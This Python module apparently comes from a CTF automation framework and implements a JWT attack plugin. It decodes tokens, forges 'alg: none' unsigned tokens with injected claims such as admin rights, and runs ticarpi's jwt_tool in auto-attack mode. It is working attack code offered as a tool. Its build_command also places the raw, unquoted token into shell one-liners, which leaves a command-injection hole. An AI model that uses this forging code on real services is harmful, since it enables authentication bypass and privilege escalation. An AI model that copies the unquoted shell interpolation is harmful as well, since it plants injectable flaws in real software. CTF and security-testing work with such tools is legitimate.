"""
sentinel_ctf.tools.web.jwt_tool
================================
JWT token analysis, decoding, and attack plugin.

Supports:
* Offline base64url decoding (no external dependency)
* ``alg:none`` attack (removes signature, accepts unsigned tokens)
* Optional integration with ``jwt_tool.py`` (ticarpi/jwt_tool) if installed

All attacks fall back to pure inline Python when the external tool is absent.
"""
from __future__ import annotations

import base64
import json
import re
import shlex
from typing import Any

from sentinel_ctf.tools.base import BaseTool
from sentinel_ctf.executor.base import BaseExecutor, ExecResult
from sentinel_ctf.core.models import JobResult

_FLAG_RE = re.compile(
    r"(?:flag|ctf|HTB|picoCTF|DUCTF|RCTF)\{[^}]{1,200}\}",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _b64url_decode(s: str) -> bytes:
    """Decode a base64url-encoded string, adding padding as needed."""
    s = s.replace("-", "+").replace("_", "/")
    pad = (4 - len(s) % 4) % 4
    return base64.b64decode(s + "=" * pad)


def _b64url_encode(data: bytes) -> str:
    """Encode bytes as base64url (no padding)."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


# ---------------------------------------------------------------------------
# Inline Python one-liners used in commands
# ---------------------------------------------------------------------------

_DECODE_ONELINER = (
    "python3 -c \""
    "import base64,json,sys; "
    "tok='{token}'; "
    "parts=tok.split('.'); "
    "dec=lambda s: json.loads(base64.urlsafe_b64decode(s+'=='[:-(len(s)%4) or 4])); "
    "h=dec(parts[0]); p=dec(parts[1]); sig=parts[2] if len(parts)>2 else ''; "
    "print('HEADER:', json.dumps(h,indent=2)); "
    "print('PAYLOAD:', json.dumps(p,indent=2)); "
    "print('SIG:', sig)"
    "\""
)

_NONE_ALG_ONELINER = (
    "python3 -c \""
    "import base64,json,sys; "
    "tok='{token}'; "
    "parts=tok.split('.'); "
    "dec=lambda s: json.loads(base64.urlsafe_b64decode(s+'=='[:-(len(s)%4) or 4])); "
    "enc=lambda d: base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode(); "
    "h=dec(parts[0]); h['alg']='none'; "
    "p=dec(parts[1]); "
    "print(enc(h)+'.'+enc(p)+'.')"
    "\""
)


class JwtTool(BaseTool):
    """
    JWT token analysis and attack tool.

    Wraps ``jwt_tool.py`` (ticarpi) when available, and falls back to
    pure Python inline one-liners for offline analysis.
    """

    name: str = "jwt"
    description: str = "JWT token analysis, decoding, algorithm confusion attacks"

    # ------------------------------------------------------------------
    # Command building
    # ------------------------------------------------------------------

    def build_command(
        self,
        token: str,
        attack: str = "decode",
        key: str = "",
        **kwargs: Any,
    ) -> str:
        """
        Build the shell command for JWT analysis or attack.

        Parameters
        ----------
        token:
            The raw JWT string (three dot-separated base64url segments).
        attack:
            One of:

            * ``'decode'`` – base64url-decode header and payload
            * ``'none_alg'`` – strip signature and set ``alg`` to ``none``
            * ``'scan'`` – run ``jwt_tool.py -M at`` (auto-mode) or decode fallback
        key:
            Optional signing key (used by external jwt_tool for certain attacks).

        Returns
        -------
        str
            Shell command string.
        """
        safe_token = shlex.quote(token)

        if attack == "decode":
            return _DECODE_ONELINER.format(token=token)

        if attack == "none_alg":
            return _NONE_ALG_ONELINER.format(token=token)

        if attack == "scan":
            # Try external jwt_tool.py; fall back to decode inline
            key_flag = f"-p {shlex.quote(key)}" if key else ""
            external = (
                f"python3 jwt_tool.py -t {safe_token} -M at {key_flag} 2>/dev/null"
            )
            fallback = _DECODE_ONELINER.format(token=token)
            return f"({external}) || ({fallback})"

        # Unknown attack — safe fallback to decode
        return _DECODE_ONELINER.format(token=token)

    # ------------------------------------------------------------------
    # Output parsing
    # ------------------------------------------------------------------

    def parse(self, result: ExecResult) -> dict[str, Any]:
        """
        Parse the command output into structured JWT data.

        Returns
        -------
        dict with keys:

        * ``header`` – decoded header dict (or empty dict)
        * ``payload`` – decoded payload dict (or empty dict)
        * ``signature`` – raw signature string
        * ``attack_result`` – raw stdout for reference
        * ``flags_found`` – CTF flags spotted in the output
        """
        stdout = result.stdout or ""
        flags_found: list[str] = []
        header: dict[str, Any] = {}
        payload: dict[str, Any] = {}
        signature = ""

        # Extract HEADER block
        h_match = re.search(r"HEADER:\s*(\{.*?\})", stdout, re.DOTALL)
        if h_match:
            try:
                header = json.loads(h_match.group(1))
            except json.JSONDecodeError:
                pass

        # Extract PAYLOAD block
        p_match = re.search(r"PAYLOAD:\s*(\{.*?\})", stdout, re.DOTALL)
        if p_match:
            try:
                payload = json.loads(p_match.group(1))
            except json.JSONDecodeError:
                pass

        # Extract SIG
        sig_match = re.search(r"SIG:\s*(\S*)", stdout)
        if sig_match:
            signature = sig_match.group(1)

        # Scan full output for flags
        for flag_m in _FLAG_RE.finditer(stdout):
            flag = flag_m.group(0)
            if flag not in flags_found:
                flags_found.append(flag)

        # Also scan payload values for flags
        for value in payload.values():
            if isinstance(value, str):
                for flag_m in _FLAG_RE.finditer(value):
                    flag = flag_m.group(0)
                    if flag not in flags_found:
                        flags_found.append(flag)

        return {
            "header": header,
            "payload": payload,
            "signature": signature,
            "attack_result": stdout,
            "flags_found": flags_found,
        }

    # ------------------------------------------------------------------
    # Static helpers
    # ------------------------------------------------------------------

    @staticmethod
    def decode(token: str) -> tuple[dict[str, Any], dict[str, Any], str]:
        """
        Offline base64url decode of a JWT token.

        Parameters
        ----------
        token:
            Raw JWT string.

        Returns
        -------
        (header_dict, payload_dict, signature_str)

        Raises
        ------
        ValueError
            If the token does not have at least two segments.
        """
        parts = token.split(".")
        if len(parts) < 2:
            raise ValueError(f"Invalid JWT token: expected at least 2 segments, got {len(parts)}")

        try:
            header_dict: dict[str, Any] = json.loads(_b64url_decode(parts[0]))
        except Exception as exc:
            raise ValueError(f"Could not decode JWT header: {exc}") from exc

        try:
            payload_dict: dict[str, Any] = json.loads(_b64url_decode(parts[1]))
        except Exception as exc:
            raise ValueError(f"Could not decode JWT payload: {exc}") from exc

        signature = parts[2] if len(parts) > 2 else ""
        return header_dict, payload_dict, signature

    @staticmethod
    def forge_none_alg(
        token: str,
        new_payload: dict[str, Any] | None = None,
    ) -> str:
        """
        Forge a JWT with ``alg: none`` (unsigned token attack).

        Optionally replaces / extends payload fields before re-encoding.

        Parameters
        ----------
        token:
            Original JWT string to forge from.
        new_payload:
            Dict of payload fields to update (e.g. ``{'admin': True}``).
            If ``None``, the original payload is preserved unchanged.

        Returns
        -------
        str
            Forged JWT with empty signature (``header.payload.``).
        """
        header, payload, _ = JwtTool.decode(token)

        # Modify algorithm
        header["alg"] = "none"

        # Optionally replace payload fields
        if new_payload:
            payload.update(new_payload)

        encoded_header = _b64url_encode(
            json.dumps(header, separators=(",", ":")).encode()
        )
        encoded_payload = _b64url_encode(
            json.dumps(payload, separators=(",", ":")).encode()
        )

        return f"{encoded_header}.{encoded_payload}."

    # ------------------------------------------------------------------
    # Shortcut
    # ------------------------------------------------------------------

    async def analyze(self, token: str, **kwargs: Any) -> JobResult:
        """
        High-level shortcut: build → execute → parse → return :class:`JobResult`.

        Parameters
        ----------
        token:
            JWT string to analyze.
        **kwargs:
            Forwarded to :meth:`build_command` and :meth:`BaseTool.run`.
        """
        return await self.run(token=token, **kwargs)
